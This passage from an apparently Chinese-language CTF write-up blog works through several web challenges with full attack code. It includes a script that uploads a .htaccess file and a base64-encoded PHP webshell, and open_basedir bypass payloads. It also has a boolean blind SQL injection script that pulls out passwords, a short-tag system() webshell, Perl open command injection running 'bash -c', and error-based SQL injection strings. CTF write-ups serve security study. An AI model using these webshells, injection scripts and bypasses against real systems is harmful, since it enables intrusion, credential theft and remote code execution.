<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="hljs-string">'[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+'</span>, re.I)</span><br><span class="line">payload = <span class="hljs-string">"_GET"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):</span><br><span class="line">    <span class="hljs-keyword">if</span> pattern.match(chr(i)):</span><br><span class="line">        <span class="hljs-keyword">continue</span></span><br><span class="line">    res = <span class="hljs-string">f"%<span class="hljs-subst">{i:<span class="hljs-number">02</span>x}</span>"</span> * len(payload)</span><br><span class="line">    res += <span class="hljs-string">"^"</span></span><br><span class="line">    f = <span class="hljs-literal">False</span></span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> payload:</span><br><span class="line">        new = ord(j)^i</span><br><span class="line">        <span class="hljs-keyword">if</span> pattern.match(chr(new)):</span><br><span class="line">            f = <span class="hljs-literal">True</span></span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        res += <span class="hljs-string">f"%<span class="hljs-subst">{ord(j)^i:<span class="hljs-number">02</span>x}</span>"</span></span><br><span class="line">    <span class="hljs-keyword">if</span> f:</span><br><span class="line">        <span class="hljs-keyword">continue</span></span><br><span class="line">    print(res)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后从输出中随便选一个来构造</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216031237.png" alt></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>这里其实就是让你去调用<code>get_the_flag()</code></p>
<p>那么我们来康康这个函数干啥</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    ...</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">"file"</span>])){</span><br><span class="line">        $tmp_name = $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/ph/i"</span>,$extension)) <span class="hljs-keyword">die</span>(<span class="hljs-string">"^_^"</span>); </span><br><span class="line">        <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">'<?'</span>)!==<span class="hljs-keyword">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">"^_^"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>(!exif_imagetype($tmp_name)) <span class="hljs-keyword">die</span>(<span class="hljs-string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="hljs-string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>其实很平淡, 我们简单分析一下</p>
<ol>
<li><code>/ph/i</code>的后缀过滤, 平时常见的php文件类型都不能用, 要么是<code>asp</code>, <code>jsp</code>这些或者是利用<code>.htaccess</code>来解析不常见类型</li>
<li><code>&#x3c;&#x3f;</code>检测, 由于我们前面可以看到php的版本为<code>7.2</code>, 之前的<code>&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;</code>的绕过就不能用了, 不过这也是个旧的知识点, base64 或者 utf-7即可</li>
<li><code>exif_imagetype</code>图像类型检测, 这个网上有很多绕过的方案了, 例如</li>
</ol>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// xbm format</span><br><span class="line">SIZE_HEADER = b"#define width 1\n#define height 1\n\n"</span><br><span class="line">// wbmp format</span><br><span class="line">SIZE_HEADER = b"\x00\x00\x8a\x39\x8a\x39"</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>在<code>.htaccess</code>中, <code>#</code>和<code>\x00</code>是注释符, 因此上面两个文件头不会影响文件的正常功能</p>
<p>然后在shell中, 需要注意的是由于使用了base64解码, 我们需要保证文件头前面是4的倍数, 这样才不会影响后面代码的解码(这里补上了<code>00</code>)</p>
<p><a href="https://www.jianshu.com/p/fbfeeb43ace2" target="_blank" rel="noopener">https://www.jianshu.com/p/fbfeeb43ace2</a></p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">r"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">SIZE_HEADER = <span class="hljs-string">b"\x00\x00\x8a\x39\x8a\x39"</span></span><br><span class="line">htaccess = SIZE_HEADER + <span class="hljs-string">b"""</span></span><br><span class="line"><span class="hljs-string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="hljs-string">php_value auto_prepend_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line">files = [</span><br><span class="line">    (<span class="hljs-string">"file"</span>,(<span class="hljs-string">".htaccess"</span>, htaccess, <span class="hljs-string">"image/gif"</span>))</span><br><span class="line">]</span><br><span class="line">proxy = {<span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span>}</span><br><span class="line">res = requests.post(url, files=files, proxies=proxy).text</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">shell = SIZE_HEADER + <span class="hljs-string">b"00"</span> + base64.b64encode(<span class="hljs-string">b"<?php eval($_GET['cjm00n']);?>"</span>)</span><br><span class="line">files = [</span><br><span class="line">    (<span class="hljs-string">"file"</span>,(<span class="hljs-string">"shell.cc"</span>, shell, <span class="hljs-string">"image/gif"</span>))</span><br><span class="line">]</span><br><span class="line">proxy = {<span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span>}</span><br><span class="line">res = requests.post(url, files=files, proxies=proxy).text</span><br><span class="line">print(res)</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h3><p>推荐一篇很详细的文章</p>
<p><a href="[https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/](https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/)">浅谈几种Bypass-open-basedir的方法</a></p>
<p>以及这篇 <a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a> 从源码分析payload</p>
<p>这里就直接放payload了</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));</span><br><span class="line"># or</span><br><span class="line">mkdir('cjm00n');chdir('cjm00n');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216035743.png" alt></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(readfile('/THis_Is_tHe_F14g'));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216035821.png" alt></p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>我们可以在<code>robots.txt</code>中发现有备份文件, 可以下载到<code>image.php.bak</code>, 看一下源码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"id"</span>])?$_GET[<span class="hljs-string">"id"</span>]:<span class="hljs-string">"1"</span>;</span><br><span class="line">$path=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"path"</span>])?$_GET[<span class="hljs-string">"path"</span>]:<span class="hljs-string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\\0"</span>,<span class="hljs-string">"%00"</span>,<span class="hljs-string">"\\'"</span>,<span class="hljs-string">"'"</span>),<span class="hljs-string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\\0"</span>,<span class="hljs-string">"%00"</span>,<span class="hljs-string">"\\'"</span>,<span class="hljs-string">"'"</span>),<span class="hljs-string">""</span>,$path);</span><br><span class="line"><span class="hljs-keyword">echo</span> $id.<span class="hljs-string">" "</span>.$path;</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="hljs-string">"select * from images where id='{$id}' or path='{$path}'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="hljs-string">"./"</span> . $row[<span class="hljs-string">"path"</span>];</span><br><span class="line">header(<span class="hljs-string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>sql注入无疑, 可以看到有<code>addslashes</code>函数</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216222146.png" alt></p>
<p>假如我们输入</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\0'</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>经过这个函数后会变成</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\0\'</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>经过替换后就只剩下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>回到sql语句中</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id='\' or path='{$path}'</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>'</code>号被成功转义, 那还不是为所欲为</p>
<p>这里我们使用布尔盲注, 脚本如下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://abaa0b80-e625-4b62-81d0-92b0987742d0.node3.buuoj.cn/image.php"</span></span><br><span class="line"><span class="hljs-comment"># url = "http://local:2333/image.php"</span></span><br><span class="line">proxies = {</span><br><span class="line">    <span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(cur, mid=<span class="hljs-string">""</span>)</span>:</span></span><br><span class="line">    <span class="hljs-comment"># payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)" % (cur, mid)</span></span><br><span class="line">    <span class="hljs-comment"># payload = " or length((select group_concat(password) from users))={}#".format(cur)</span></span><br><span class="line">    <span class="hljs-comment"># 一开始把#写成%23, 结果一直不对, 后面才想起python会自动编码...</span></span><br><span class="line">    payload = <span class="hljs-string">" or if(ascii(substr((select group_concat(password) from users),%d,1))>%d,1,0)#"</span> % (cur, mid)</span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"id"</span>: <span class="hljs-string">"\\0'"</span>,</span><br><span class="line">        <span class="hljs-string">"path"</span>: payload</span><br><span class="line">    }</span><br><span class="line">    res = requests.get(url, params=data, proxies=proxies)</span><br><span class="line">    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">429</span>:</span><br><span class="line">        print(<span class="hljs-string">'too fast'</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">"JFIF"</span> <span class="hljs-keyword">in</span> res.text:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_length</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>, <span class="hljs-number">25</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> attack(i):</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        sleep(<span class="hljs-number">0.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    flag = <span class="hljs-string">""</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">22</span>):</span><br><span class="line">        end = <span class="hljs-number">127</span></span><br><span class="line">        start = <span class="hljs-number">31</span></span><br><span class="line">        mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">while</span> end > start:</span><br><span class="line">            <span class="hljs-keyword">if</span> attack(i, mid):</span><br><span class="line">                start = mid + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">            sleep(<span class="hljs-number">0.02</span>)</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    <span class="hljs-comment"># try_length()</span></span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后就能注出密码</p>
<p>登陆后可以看到有个文件上传点</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216222847.png" alt></p>
<p>上传后提示会记录文件名, 并且log文件为<code>php</code>格式, 但是由于存在<code>/php/i</code>的过滤, 使用短标签绕过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><?=system($_GET[c]);?></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216223009.png" alt></p>
<p>后面就直接<code>cat /flag</code></p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) {</span><br><span class="line">        $http_x_headers = explode(<span class="hljs-string">','</span>, $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $http_x_headers[<span class="hljs-number">0</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">echo</span> $_SERVER[<span class="hljs-string">"REMOTE_ADDR"</span>];</span><br><span class="line">    $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = <span class="hljs-string">'113.101.89.250'</span>;</span><br><span class="line">    $sandbox = <span class="hljs-string">"sandbox/"</span> . md5(<span class="hljs-string">"orange"</span> . $_SERVER[<span class="hljs-string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="hljs-string">"GET "</span> . escapeshellarg($_GET[<span class="hljs-string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="hljs-string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="hljs-string">"."</span>, <span class="hljs-string">""</span>, basename($info[<span class="hljs-string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="hljs-string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>代码很短, 一眼可以看到有行</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = shell_exec(<span class="hljs-string">"GET "</span> . escapeshellarg($_GET[<span class="hljs-string">"url"</span>]));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>本地测的时候不能运行</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216230416.png" alt></p>
<p>查了一下发现是<code>perl</code>, 说来这道题是不是<code>buuoj</code>上面的配置不对, 这里我用的是data协议直接做</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=data://baidu.com,base64,<?eval($_GET[c]);?>&filename=test.php</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后就直接getshell了, 这不是题目的本意, 继续看看</p>
<p>可以查到perl有个<code>open</code>命令的漏洞</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216233516.png" alt></p>
<p>而<code>GET</code>底层是用了<code>open</code>实现, 那就可以绕过了</p>
<p>而且有一说一, 这个<code>GET</code>命令是真的顶</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&filename=test8.php</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这样就可以直接读目录了, 读文件读目录无所不能??</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216232158.png" alt></p>
<p>太神奇了</p>
<p>参考 <a href="https://www.jianshu.com/p/3f82685f56a8" target="_blank" rel="noopener">https://www.jianshu.com/p/3f82685f56a8</a></p>
<p>然后利用<code>open</code>的命令执行, </p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?url=file:bash%20-c%20/readflag|&filename=bash%20-c%20/readflag|</span><br><span class="line">/?url=file:bash%20-c%20/readflag|&filename=2</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216233037.png" alt></p>
<p>另外还有<code>CVE-2016-1238</code>, 这个也很骚, 不过懒得再去开<code>linux_labs</code>就不重现了</p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>报错注入, 绕过过滤的方法如下</p>
<ul>
<li><code></code> => <code>()</code></li>
<li><code>=</code> => <code>like</code></li>
</ul>
<p>然后就可以顺利注出表名和列名</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'^(updatexml(1,concat(0x7e,(SELECT(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database()))),0x7e),1))^'1</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里可以看到在拿flag的时候出现了长度不够</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'^(updatexml(1,concat(0x7e,(SELECT((group_concat(password)))from(H4rDsq1)),0x7e),1))^'1</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217010303.png" alt></p>
<p>加上个<code>reverse</code>即可</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'^(updatexml(1,concat(0x7e,(SELECT(reverse(group_concat(password)))from(H4rDsq1)),0x7e),1))^'1</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217010331.png" alt></p>
<p>手动拼接即可得到flag</p>
<h2 id="LCTF-2018-bestphp’s-revenge"><a href="#LCTF-2018-bestphp’s-revenge" class="headerlink" title="[LCTF 2018]bestphp’s revenge"></a>[LCTF 2018]bestphp’s revenge</h2><p>index.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="hljs-string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="hljs-string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>])) {</span><br><span class="line">    $_SESSION[<span class="hljs-string">'name'</span>] = $_GET[<span class="hljs-string">'name'</span>];</span><br><span class="line">}</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>flag.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="hljs-string">'LCTF{*************************}'</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">"REMOTE_ADDR"</span>]===<span class="hljs-string">"127.0.0.1"</span>){</span><br><span class="line">       $_SESSION[<span class="hljs-string">'flag'</span>] = $flag;</span><br><span class="line">   }</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>源码如上, 大概的想法是通过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET['f'], $_POST);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这一行进行变量覆盖, 然后在最后一行执行代码</p>
<p>首先尝试将<code>$b</code>覆盖成<code>var_dump</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217201126.png" alt></p>
<p>但是这里失败了, 不太懂为什么没有覆盖成功</p>
<p>查了一下相应的wp, 也是用的<code>extract</code>, 这就很迷了</p>
<p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-详细题解/" target="_blank" rel="noopener">lctf2018-bestphps-revenge-详细题解</a></p>
<p>推荐一下<code>smi1e</code>师傅的wp, 以下直接引用部分</p>
